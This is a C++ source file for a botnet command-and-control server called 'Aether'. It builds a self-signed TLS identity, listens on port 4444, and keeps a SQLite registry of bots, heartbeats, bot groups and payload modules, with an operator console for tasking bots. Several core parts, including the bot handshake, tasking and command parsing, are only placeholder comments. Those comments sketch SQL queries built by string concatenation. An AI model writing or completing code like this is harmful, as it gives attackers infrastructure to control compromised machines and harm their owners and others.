#include "c2_server.hpp"
#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <openssl/pem.h>
#include <sstream>
#include <random>
#include <algorithm>
#include <vector>
#include <filesystem>

// --- Helper to generate a self-signed certificate ---
void generate_self_signed_cert(RSA* rsa, X509** x509) {
    *x509 = X509_new();
    X509_set_version(*x509, 2);
    ASN1_INTEGER_set(X509_get_serialNumber(*x509), time(NULL));
    X509_gmtime_adj(X509_get_notBefore(*x509), 0);
    X509_gmtime_adj(X509_get_notAfter(*x509), 31536000L); // 1 year validity

    EVP_PKEY* pkey = EVP_PKEY_new();
    EVP_PKEY_assign_RSA(pkey, rsa);
    X509_set_pubkey(*x509, pkey);

    X509_NAME* name = X509_get_subject_name(*x509);
    X509_NAME_add_entry_by_txt(name, "C", MBSTRING_ASC, (unsigned char*)"US", -1, -1, 0);
    X509_NAME_add_entry_by_txt(name, "O", MBSTRING_ASC, (unsigned char*)"Aether", -1, -1, 0);
    X509_NAME_add_entry_by_txt(name, "CN", MBSTRING_ASC, (unsigned char*)"localhost", -1, -1, 0);
    X509_set_issuer_name(*x509, name);

    X509_sign(*x509, pkey, EVP_sha256());
    EVP_PKEY_free(pkey);
}

// --- C2Core Implementation ---

C2Core::C2Core() : server_fd_(-1), rsa_keypair_(nullptr), certificate_(nullptr), db_(nullptr), running_(false) {
    if (!initialize_rsa()) throw std::runtime_error("Failed to initialize RSA keypair");
    generate_self_signed_cert(rsa_keypair_, &certificate_);
    init_database();
}

C2Core::~C2Core() {
    stop();
    if (rsa_keypair_) RSA_free(rsa_keypair_);
    if (certificate_) X509_free(certificate_);
    if (server_fd_ != -1) close(server_fd_);
    if (db_) sqlite3_close(db_);
}

void C2Core::run() {
    running_ = true;
    db_thread_ = std::thread(&C2Core::db_writer_thread, this);

    server_fd_ = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd_ == -1) throw std::runtime_error("Failed to create socket");

    sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(4444);
    int optval = 1;
    setsockopt(server_fd_, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    if (bind(server_fd_, (sockaddr*)&address, sizeof(address)) < 0) throw std::runtime_error("Failed to bind");
    if (listen(server_fd_, 10) < 0) throw std::runtime_error("Failed to listen");

    std::cout << "[CORE] C2 Daemon listening on port 4444..." << std::endl;
    listener_thread();
}

void C2Core::stop() {
    running_ = false;
    db_cond_.notify_one();
    if (db_thread_.joinable()) db_thread_.join();
}

void C2Core::init_database() {
    if (sqlite3_open("c2_eternal.db", &db_)) throw std::runtime_error("Can't open database");
    const char* schema = 
        "CREATE TABLE IF NOT EXISTS bots(id TEXT PRIMARY KEY, os_info TEXT, last_heartbeat INT, is_active INT);"
        "CREATE TABLE IF NOT EXISTS groups(name TEXT PRIMARY KEY);"
        "CREATE TABLE IF NOT EXISTS group_members(group_name TEXT, bot_id TEXT, UNIQUE(group_name, bot_id));"
        "CREATE TABLE IF NOT EXISTS modules(name TEXT PRIMARY KEY, data BLOB);"
        "UPDATE bots SET is_active = 0;";
    char* err_msg = 0;
    if (sqlite3_exec(db_, schema, 0, 0, &err_msg) != SQLITE_OK) {
        std::string error = "SQL error: " + std::string(err_msg);
        sqlite3_free(err_msg);
        throw std::runtime_error(error);
    }
}

void C2Core::queue_db_query(const std::string& query) {
    std::lock_guard<std::mutex> lock(db_queue_mutex_);
    db_queue_.push(query);
    db_cond_.notify_one();
}

void C2Core::db_writer_thread() {
    while (running_) {
        std::unique_lock<std::mutex> lock(db_queue_mutex_);
        db_cond_.wait(lock, [this]{ return !db_queue_.empty() || !running_; });
        if (!running_ && db_queue_.empty()) return;

        std::string query = db_queue_.front();
        db_queue_.pop();
        lock.unlock();

        char* err_msg = 0;
        if (sqlite3_exec(db_, query.c_str(), 0, 0, &err_msg) != SQLITE_OK) {
            std::cerr << "[DB] " << sqlite3_errmsg(db_) << std::endl;
            sqlite3_free(err_msg);
        }
    }
}

void C2Core::listener_thread() {
    while (running_) {
        int client_socket = accept(server_fd_, nullptr, nullptr);
        if (client_socket < 0) continue;
        std::thread(&C2Core::handle_connection, this, client_socket).detach();
    }
}

void C2Core::handle_connection(int client_socket) {
    // Handshake
    std::string key_pem = get_public_key_pem();
    std::string cert_pem = get_cert_pem();
    std::string handshake_data = key_pem + cert_pem;
    send(client_socket, handshake_data.c_str(), handshake_data.length(), 0);
    
    // ... rest of handshake and main loop ...
    // On new bot registration:
    // queue_db_query("INSERT OR REPLACE INTO bots(...) VALUES(...)");
    // On disconnect:
    // queue_db_query("UPDATE bots SET is_active = 0 WHERE id = '...'");
}

// ... Other C2Core methods like handle_heartbeat, send_task, etc. ...
// ... These methods will now use queue_db_query(...) instead of sqlite3_exec(...) ...

// --- OperatorConsole Implementation ---

OperatorConsole::OperatorConsole(C2Core& core) : core_(core) {}

void OperatorConsole::run() {
    std::string line;
    while (std::cout << "> " && std::getline(std::cin, line)) {
        // ... command parsing logic ...
        // e.g., if (cmd == "group") {
        //   core_.manage_group(action, group_name, bot_id);
        // }
    }
}

// --- Main ---
int main() {
    try {
        C2Core core;
        std::thread core_thread(&C2Core::run, &core);
        
        OperatorConsole console(core);
        console.run();

        core.stop();
        core_thread.join();
    } catch (const std::exception& e) {
        std::cerr << "Fatal Error: " << e.what() << std::endl;
        return 1;
    }
    return 0;
}